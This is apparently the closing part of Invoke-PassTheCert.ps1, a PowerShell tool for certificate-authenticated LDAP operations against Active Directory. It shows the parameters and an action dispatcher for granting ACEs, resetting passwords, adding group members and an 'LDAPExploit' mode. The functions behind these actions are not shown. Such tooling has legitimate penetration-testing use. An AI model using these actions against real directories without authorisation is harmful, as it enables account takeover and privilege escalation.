        [Parameter(Position=7, Mandatory=$false, HelpMessage="Enter the Seach Base of the LDAP lookup (accepted values: 'Base', 'OneLevel', 'Subtree')")]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [PSDefaultValue(Help="Defaults to 'Subtree' (i.e. search recursively from the given Search Base)")]
        [System.String]$SearchScope = 'Subtree',
        
        [Parameter(Position=8, Mandatory=$false, HelpMessage="Enter the Properties to be returned")]
        [PSDefaultValue(Help="Defaults to '*' (i.e. get all properties of the returned object(s))")]
        [System.String]$Properties = '*',
        
        [Parameter(Position=9, Mandatory=$false, HelpMessage="Enter LDAP Filter of the LDAP lookup")]
        [System.String]$LDAPFilter,
        
        [Parameter(Position=10, Mandatory=$false, HelpMessage="Enter UAC Flag(s) or Value to be filtered from the LDAP lookup")]
        [System.String]$UACFilter,
        
        [Parameter(Position=11, Mandatory=$false, HelpMessage="Enter DN to be filtered from the LDAP lookup")]
        [System.String]$DNFilter,
        
        [Parameter(Position=12, Mandatory=$false, HelpMessage="Enter GUID to be filtered from the LDAP lookup")]
        [System.String]$GUIDFilter,
        
        [Parameter(Position=13, Mandatory=$false, HelpMessage="Enter SID to be filtered from the LDAP lookup")]
        [System.String]$SIDFilter,

        [Parameter(Position=14, Mandatory=$false, HelpMessage="Enter the old password of the certificate-authenticated user (if applicable, i.e. if the LDAP/S Server's policy requires it)")]
        [System.String]$OldPassword,

        [Parameter(Position=15, Mandatory=$false, HelpMessage="Enter the new password to set")]
        # Not setting its type [System.String] allows to differentiate '' and $null
        # If we use [System.String]$NewPassword, then we won't be allowed to differentiate when the variable is set to '', or $null => It will always be considered as '', even if unspecified from the command line.
        # Being able to tell when this parameter is $null (and NOT '') can be handy to differentiate, for instance, if the user wanna create a new computer with a default password (i.e. unspecified), or an empty password (i.e. set to '')
        $NewPassword,

        [Parameter(Position=16, Mandatory=$false, HelpMessage="Enter the attribute to be processed")]
        [System.String]$Attribute,

        [Parameter(Position=17, Mandatory=$false, HelpMessage="Enter the value to be processed")]
        [System.String]$Value,

        [Parameter(Position=18, Mandatory=$false, HelpMessage="Enter the identity of the group to be processed")]
        [System.String]$GroupDN,

        [Parameter(Position=19, Mandatory=$false, HelpMessage="Enter the Qualifier of the ACE to search (i.e. 'AccessAllowed', 'AccessDenied', 'SystemAudit', or 'SystemAlarm')")]
        [ValidateSet('AccessAllowed', 'AccessDenied', 'SystemAudit', 'SystemAlarm')]
        [System.String]$AceQualifier,

        [Parameter(Position=20, Mandatory=$false, HelpMessage="Enter the Access Mask Name(s) (comma-separated, if multiple) of the ACE (among 'CreateChild', 'DeleteChild', 'ListChildren', 'Self', 'ReadProperty', 'WriteProperty', 'DeleteTree', 'ListObject', 'ExtendedRight', 'Delete', 'ReadControl', 'GenericExecute', 'GenericWrite', 'GenericRead', 'WriteDacl', 'WriteOwner', 'GenericAll', 'Synchronize', and 'AccessSystemSecurity')")]
        [System.String]$AccessMaskNames,

        [Parameter(Position=21, Mandatory=$false, HelpMessage="Enter the Access Right Name (i.e. ObjectAceType) of the ACE (refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt')")]
        [PSDefaultValue(Help="Defaults to empty string to handle ACEs without ObjectAceType (i.e. with access mask(s) only, such as 'GenericAll')")]
        [System.String]$AccessRightName = '',

        [Parameter(Position=22, Mandatory=$false, HelpMessage="Enter the Access Right GUID (i.e. ObjectAceType) of the ACE to create (... ¿ do you really need to specify it, as you may conveniently use -AccessRightName instead ? ...)")]
        [System.String]$AccessRightGUID = '',

        [Parameter(Position=23, Mandatory=$false, HelpMessage="Whenever Set, shows the Detailed Get-Help for the specified action")]
        [Alias('h')]
        [Alias('hd')]
        [switch]$HelpDetailed,

        [Parameter(Position=24, Mandatory=$false, HelpMessage="Whenever Set, shows the Examples Get-Help for the specified action")]
        [Alias('he')]
        [switch]$HelpExamples,

        [Parameter(Position=25, Mandatory=$false, HelpMessage="Whenever Set, shows the Full Get-Help for the specified action")]
        [Alias('hf')]
        [Alias('hh')]
        [switch]$HelpFull,

        [Parameter(Position=26, Mandatory=$false, HelpMessage="Whenever Set, shows the list of available actions")]
        [Alias('a')]
        [switch]$ListActions,

        [Parameter(Position=27, Mandatory=$false, HelpMessage="Enter the path of the certificate to export")]
        [System.String]$ExportPath,

        [Parameter(Position=28, Mandatory=$false, HelpMessage="Enter the type of the certificate to export ('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', or 'Authenticode')")]
        [ValidateSet('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode')]
        [PSDefaultValue(Help="Defaults to Pfx")]
        [System.String]$ExportContentType = 'Pfx',

        [Parameter(Position=29, Mandatory=$false, HelpMessage="Enter the password of the certificate to export")]
        [PSDefaultValue(Help="Defaults to empty password")]
        [System.String]$ExportPassword = '',

        [Parameter(Position=30, Mandatory=$false, HelpMessage="Enter the UAC Flag(s) (comma-separated, if multiple)")]
        [System.String]$UACFlags,

        [Parameter(Position=31, Mandatory=$false, HelpMessage="Enter the sAMAccountName")]
        [System.String]$sAMAccountName,

        [Parameter(Position=32, Mandatory=$false, HelpMessage="Enter the object type")]
        [System.String]$ObjectType,

        [Parameter(Position=33, Mandatory=$false, HelpMessage="Enter the Type of the SDDL entry")]
        [System.String]$SDDLACEType,

        [Parameter(Position=34, Mandatory=$false, HelpMessage="Enter the Right(s) of the SDDL entry")]
        [System.String]$SDDLACERights,

        [Parameter(Position=35, Mandatory=$false, HelpMessage="Enter the identity of the principal")]
        [System.String]$Identity,

        [Parameter(Position=36, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Identity' Parameter (REQUIRED if the '-Identity' parameter is NOT a distinguished name)")]
        [System.String]$IdentityDomain,

        [Parameter(Position=37, Mandatory=$false, HelpMessage="Enter the identity of the targeted object")]
        [System.String]$Target,

        [Parameter(Position=38, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Target' Parameter (REQUIRED if the '-Target' parameter is NOT a distinguished name)")]
        [System.String]$TargetDomain,

        [Parameter(Position=39, Mandatory=$false, HelpMessage="Enter the identity of the object")]
        [System.String]$Object,

        [Parameter(Position=40, Mandatory=$false, HelpMessage="Enter the Domain Of The '-Object' Parameter (REQUIRED if the '-Object' parameter is NOT a distinguished name)")]
        [System.String]$ObjectDomain,
        
        [Parameter(Position=1337, Mandatory=$false, HelpMessage="Set to true to hide the banner :(")]
        [PSDefaultValue(Help="Defaults to showing the banner")]
        [switch]$NoBanner = $false,

        # =========================================
        # =====      LD4P3num'Th3m'411!       =====
        # =========================================
        
        [Parameter(Position=2000, Mandatory=$false, HelpMessage="LDAP Enumeration to perform")]
        [System.String]$Enum,
        
        [Parameter(Position=2001, Mandatory=$false, HelpMessage="Enter the name of th4' thing to enumerate")]
        [System.String]$Name,

        # =========================================
        # =====     LD4P$Sp10yt'Th3m'411!     =====
        # =========================================

        [Parameter(Position=3000, Mandatory=$false, HelpMessage="LDAP Exploitation to perform")]
        [System.String]$Exploit,

        [Parameter(Position=3001, Mandatory=$false)]
        [System.String]$SPN,

        [Parameter(Position=3002, Mandatory=$false)]
        [System.String]$OwnerSID,

        # =========================================
        # =====         M4K3 Y0ur 0wN!        =====
        # =========================================
        
        [Parameter(Position=4000, Mandatory=$false, HelpMessage="The Customizator value of the Customized Custom Stuff.")]
        $Customizator,

        [Parameter(Position=4001, Mandatory=$false, HelpMessage="The Customizatoration on which the Customized Custom Stuff must be applied on Customizing'ly (Optional).")]
        [PSDefaultValue(Help="Defaults to root Customizatoration")]
        $Customizatoration = 'root'



    )

    
    if (-not $NoBanner) {  _ShowBanner; }

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    try {

        # Manually handle the switch/alias to show helps.
        if ($ListActions -eq $true) {
            Write-Host ""
            Write-Host "[*] Available Actions Are:"
            Write-Host "$((Get-Command Invoke-PassTheCert).Parameters['Action'].Attributes |?{ $_.TypeId.Name -eq "ValidateSetAttribute" } |Select-Object -ExpandProperty ValidValues | %{
                "    PS > Invoke-PassTheCert -Action '$_' -h / -he / -hh"
            } | Out-String)"; 
            return
        }
        elseif ($HelpDetailed) { _Helper-ShowHelpOfFunction -FunctionName "_$Action" -HelpType 'Detailed'; return; }
        elseif ($HelpExamples) { _Helper-ShowHelpOfFunction -FunctionName "_$Action" -HelpType 'Examples'; return; }
        elseif ($HelpFull) { _Helper-ShowHelpOfFunction -FunctionName "_$Action" -HelpType 'Full'; return; }

        # Else, Proceed with the action
        else {
            # Converting the provided Identity/Target/Object parameters into their respective Distinguished Name, if applicable.
            if ($Identity) {
                if ((_Helper-GetTypeOfIdentityString -IdentityString $Identity) -ne 'distinguishedName') {
                    if (-not $IdentityDomain) { Write-Host "[!] If '-Identity' Is NOT A Distinguished Name, Then '-IdentityDomain' Becomes Mandatory !"; return }
                    $IdentityDN = _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString $Identity -IdentityDomain $IdentityDomain
                } else { $IdentityDN = $Identity }
            }
            if ($Target) {
                if ((_Helper-GetTypeOfIdentityString -IdentityString $Target) -ne 'distinguishedName') {
                    if (-not $TargetDomain) { Write-Host "[!] If '-Target' Is NOT A Distinguished Name, Then '-TargetDomain' Becomes Mandatory !"; return }
                    $TargetDN = _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString $Target -IdentityDomain $TargetDomain
                } else { $TargetDN = $Target }
            }
            if ($Object) {
                if ((_Helper-GetTypeOfIdentityString -IdentityString $Object) -ne 'distinguishedName') {
                    if (-not $ObjectDomain) { Write-Host "[!] If '-Object' Is NOT A Distinguished Name, Then '-ObjectDomain' Becomes Mandatory !"; return }
                    $ObjectDN = _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString $Object -IdentityDomain $ObjectDomain
                } else { $ObjectDN = $Object }
            }
        }

    } catch { Write-Host "[!] Initialization Failed With Error: $_"; return }

    try {
        Write-Verbose "[*] Performing Action '$Action'..."
        switch ($Action) {

            # =========================================
            # =====         BUILDING BLOCKS       =====
            # =========================================
            
            "LDAPExtendedOperationWhoami" { 
                $Result = _LDAPExtendedOperationWhoami -LdapConnection $LdapConnection; 
            }
            "LDAPExtendedOperationPasswordModify" { 
                $Result = _LDAPExtendedOperationPasswordModify -LdapConnection $LdapConnection -NewPassword $NewPassword; 
            }
            "Filter" { 
                if ($DNFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -DNFilter $DNFilter -SearchScope $SearchScope -Properties $Properties; }
                elseif ($UACFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -UACFilter $UACFilter -SearchScope $SearchScope -Properties $Properties; }
                elseif ($GUIDFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -GUIDFilter $GUIDFilter -SearchScope $SearchScope -Properties $Properties; }
                elseif ($SIDFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SIDFilter $SIDFilter -SearchScope $SearchScope -Properties $Properties; }
                elseif ($LDAPFilter) { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -LDAPFilter $LDAPFilter -SearchScope $SearchScope -Properties $Properties; }
                else { $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -Properties $Properties; }
            }
            "CreateObject" {
                if ($NewPassword -eq '') { $Result = _CreateObject -LdapConnection $LdapConnection -ObjectType $ObjectType -ObjectDN $ObjectDN -sAMAccountName $sAMAccountName -UACFlags $UACFlags -NewPassword ''; }
                elseif ($NewPassword -eq $null) { $Result = _CreateObject -LdapConnection $LdapConnection -ObjectType $ObjectType -ObjectDN $ObjectDN -sAMAccountName $sAMAccountName -UACFlags $UACFlags; }
                else { $Result = _CreateObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -ObjectType $ObjectType -sAMAccountName $sAMAccountName -UACFlags $UACFlags -NewPassword $NewPassword; }
            }
            "DeleteObject" {
                $Result = _DeleteObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN;
            }
            "GetInboundACEs" {
                $Result = _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $ObjectDN;
            }
            "CreateInboundACE" {
                $Result = _CreateInboundACE -LdapConnection $LdapConnection -IdentityDN $IdentityDN -AceQualifier $AceQualifier -AccessMaskNames $AccessMaskNames -AccessRightName $AccessRightName -TargetDN $TargetDN -AccessRightGUID $AccessRightGUID;
            }
            "DeleteInboundACE" {
                $Result = _DeleteInboundACE -LdapConnection $LdapConnection -IdentityDN $IdentityDN -AceQualifier $AceQualifier -AccessMaskNames $AccessMaskNames -AccessRightName $AccessRightName -TargetDN $TargetDN -AccessRightGUID $AccessRightGUID;
            }
            "GetInboundSDDLs" {
                $Result = _GetInboundSDDLs -LdapConnection $LdapConnection -ObjectDN $ObjectDN
            }
            "CreateInboundSDDL" { 
                $Result = _CreateInboundSDDL -LdapConnection $LdapConnection -IdentityDN $IdentityDN -TargetDN $TargetDN -Attribute $Attribute -SDDLACEType $SDDLACEType -SDDLACERights $SDDLACERights;
            }
            "UpdatePasswordOfIdentity" { 
                $Result = _UpdatePasswordOfIdentity -LdapConnection $LdapConnection -IdentityDN $IdentityDN -NewPassword $NewPassword;
            }
            "OverwriteValueInAttribute" { 
                $Result = _OverwriteValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute $Attribute -Value $Value;
            }
            "AddValueInAttribute" { 
                $Result = _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute $Attribute -Value $Value;
            }
            "RemoveValueInAttribute" { 
                $Result = _RemoveValueInAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute $Attribute -Value $Value;
            }
            "ClearAttribute" { 
                $Result = _ClearAttribute -LdapConnection $LdapConnection -IdentityDN $IdentityDN -Attribute $Attribute;
            }
            "ShowStatusOfAccount" { 
                $Result = _ShowStatusOfAccount -LdapConnection $LdapConnection -IdentityDN $IdentityDN;
            }
            "EnableAccount" {
                $Result = _EnableAccount -LdapConnection $LdapConnection -IdentityDN $IdentityDN;
            }
            "DisableAccount" { 
                $Result = _DisableAccount -LdapConnection $LdapConnection -IdentityDN $IdentityDN;
            }
            "AddGroupMember" { 
                $Result = _AddGroupMember -LdapConnection $LdapConnection -IdentityDN $IdentityDN -GroupDN $GroupDN;
            }
            "RemoveGroupMember" { 
                $Result = _RemoveGroupMember -LdapConnection $LdapConnection -IdentityDN $IdentityDN -GroupDN $GroupDN;
            }




            # =========================================
            # =====      LD4P3num'Th3m'411!       =====
            # =========================================
    
            "LDAPEnum" {
                _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope -Name $Name -ObjectDN $ObjectDN
            }




            # =========================================
            # =====     LD4P$Sp10yt'Th3m'411!     =====
            # =========================================

            "LDAPExploit" {
                _LDAPExploit -LdapConnection $LdapConnection -Exploit $Exploit -IdentityDN $IdentityDN -TargetDN $TargetDN -SPN $SPN -OwnerSID $OwnerSID
            }




            # =========================================
            # =====       M4K3 Y0ur 0wn !!!       =====
            # =========================================

            "TODO" {
                _TODO -LdapConnection $LdapConnection -Customizator $Customizator -Customizatoration $Customizatoration
            }



            Default { Write-Host "[!] Action '$Action' Not Recognized !" }
        }
    } catch { Write-Host "[!] Action '$Action' Failed With Error: $_" }
    # Commented in the case the user provides it's own '$LdapConnection'; it shouldn't be disposed between executions.
    #finally { if ($LdapConnection) {$LdapConnection.Dispose()} } 
    
    Write-Host ""
    
    return $Result
}




# =====================================
# ==              Main              ===
# =====================================

[Parameter(Position=0, Mandatory=$false, HelpMessage="Don't show the banner whenever set :(")]
[PSDefaultValue(Help="Show the banner")]
[switch]$NoBanner = $false

Write-Host ""

if (-not $NoBanner) {  _ShowBanner; }

# Required .NET Assembly providing LDAP functionalities
Add-Type -AssemblyName System.DirectoryServices.Protocols

# ReGEX'ly way of checking whether the current script is being loaded using either '. .\Invoke-PassTheCert.ps1' or 'Import-Module .\Invoke-PassTheCert'.
# If loaded as a module, do not run the main function to display help.
$SkipStartup = $MyInvocation.Line -imatch '.*(Import-Module|\.)\s+.*Invoke-PassTheCert\.ps1.*'

# Note that when the script is being imported using 'Import-Module' specifically, '$MyInvocation.Line' contains the first line of this script (+EOL), as if the content of the file is dynamically copy-pasted and run in the powershell process.
# Thus, another condition is used to check if this script is being loaded: Does it match the first line of this file (+EOL) ?
if (-not $PSCommandPath) { $CurrentFile = $MyInvocation.MyCommand.Path } else { $CurrentFile = $PSCommandPath }
$SkipStartup = $SkipStartup -or $MyInvocation.Line -match "$(Get-Content $CurrentFile | Select-Object -First 1)`r?`n"

if (-not $SkipStartup) {
    # If no argument is provided (e.g. using '.\Invoke-PassTheCert.ps1', automatically show Invoke-PassTheCert's Get-Help)
    if ($Args.Count -eq 0) {
        Write-Host "[!] No Argument Provided ! Try The Following To Get Started... (4nd 3nj0y Th4' R1d3 !)"
        Write-Host ""
        Write-Host "    PS > .\Invoke-PassTheCert.ps1 -?"
    } elseif ($Args.Count -gt 0 -and ($Args -contains '-?' -or $Args -contains '-h' -or $Args -contains '-Help')) {
        # Stripping irrelevant 'REMARKS' section
        Invoke-PassTheCert -? |Out-String |Select-String -Pattern "(?ms)(.*)`r`n\s*REMARKS\s+.*" |ForEach-Object {$_.Matches.Groups[1].Value}
    }
    Write-Host ""
}